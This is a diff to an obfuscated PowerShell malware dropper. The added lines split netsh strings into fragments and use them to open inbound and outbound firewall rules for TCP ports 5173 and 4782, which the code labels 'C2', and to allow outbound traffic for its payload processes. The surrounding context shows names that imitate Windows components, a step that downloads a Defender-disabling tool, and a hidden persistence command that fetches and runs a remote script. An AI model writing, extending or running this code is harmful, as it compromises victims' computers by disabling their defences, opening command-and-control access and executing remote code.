@@ -36,6 +36,12 @@ $n42='Win';$n43='dows';$n44='Secu';$n45='rity';$n46='Heal';$n47='th';$rkName=$n4
 $n48='Win';$n49='dows';$n50='Upda';$n51='teOr';$n52='ches';$n53='trat';$n54='or';$rkNameAdmin=$n48+$n49+$n50+$n51+$n52+$n53+$n54
 $n55='Win';$n56='dows';$n57='Heal';$n58='thMo';$n59='nito';$n60='r';$taskName=$n55+$n56+$n57+$n58+$n59+$n60
 
+# Firewall strings
+$n61='net';$n62='sh a';$n63='dvfi';$n64='rewa';$n65='ll';$fw=$n61+$n62+$n63+$n64+$n65
+$n66='fire';$n67='wall';$n68=' add';$n69=' rul';$n70='e na';$n71='me=';$fwAdd=$n66+$n67+$n68+$n69+$n70+$n71
+$n72=' dir';$n73='=in ';$n74='act';$n75='ion';$n76='=al';$n77='low ';$n78='pro';$n79='toc';$n80='ol=';$n81='TCP';$fwIn=$n72+$n73+$n74+$n75+$n76+$n77+$n78+$n79+$n80+$n81
+$n82=' loc';$n83='alpo';$n84='rt=';$fwOut=$n72.Replace('in','out')+$n73.Replace('in','out')+$n74+$n75+$n76+$n77+$n78+$n79+$n80+$n81
+
 $t=$env:TEMP
 $ad="$env:APPDATA\Microsoft"
 $ld="$env:LOCALAPPDATA\Microsoft"
@@ -131,6 +137,31 @@ if(_bitsDL $wdf $wdfPath 'defkill'){
     }
 }else{_cb 'S2' 'fail' 'defkill dl'}
 Remove-Item $wdfPath -Force -ErrorAction SilentlyContinue | Out-Null
+
+# === STEP 3.5: FIREWALL RULES (inbound + outbound for C2 ports) ===
+if($cbIsAdmin){
+    log "S2b: adding firewall rules"
+    $ports=@('5173','4782')
+    foreach($port in $ports){
+        try{
+            & $fw $fwAdd"`"C2-In-$port`" $fwIn $n82$n83$n84$port" 2>&1 | Out-Null
+            log "S2b: inbound rule added for TCP $port"
+        }catch{log "S2b: inbound $port fail: $_"}
+        try{
+            & $fw $fwAdd"`"C2-Out-$port`" $fwOut $n82$n83$n84$port" 2>&1 | Out-Null
+            log "S2b: outbound rule added for TCP $port"
+        }catch{log "S2b: outbound $port fail: $_"}
+    }
+    # Outbound allow for payload processes
+    $fwProcs=@($wmd,$wdsr)
+    foreach($fp in $fwProcs){
+        try{
+            & $fw $fwAdd"`"C2-Proc-$fp`" $fwOut.Replace($n81,'Any') $n82.Replace('local','')$n83.Replace('port','')$n84.Replace('rt=','program=')"$ad\$fp"" 2>&1 | Out-Null
+            log "S2b: outbound rule added for $fp"
+        }catch{log "S2b: outbound proc $fp fail: $_"}
+    }
+    _cb 'S2b' 'ok' 'fw rules added'
+}else{_cb 'S2b' 'warn' 'no admin, skip fw'}
 
 # === STEP 4: PERSISTENCE ===
 $persistCmd="powershell -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`$env:TEMP\\u.ps1,`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1`""
